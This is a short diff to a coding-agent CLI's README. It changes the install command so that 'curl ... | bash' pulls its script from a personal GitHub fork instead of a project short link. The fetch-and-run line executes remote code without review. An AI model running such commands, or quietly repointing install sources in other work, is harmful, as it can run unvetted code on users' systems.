@@ -80,7 +80,7 @@ A pre-built coding agent in your terminal â€” similar to Claude Code or Cursor â
 </p>
 
 ```bash
-curl -LsSf https://langch.in/gh-da-cli | bash
+curl -LsSf https://raw.githubusercontent.com/marathan24/deepagents/main/libs/cli/scripts/install.sh | bash
 ```
 
 **Highlights:**
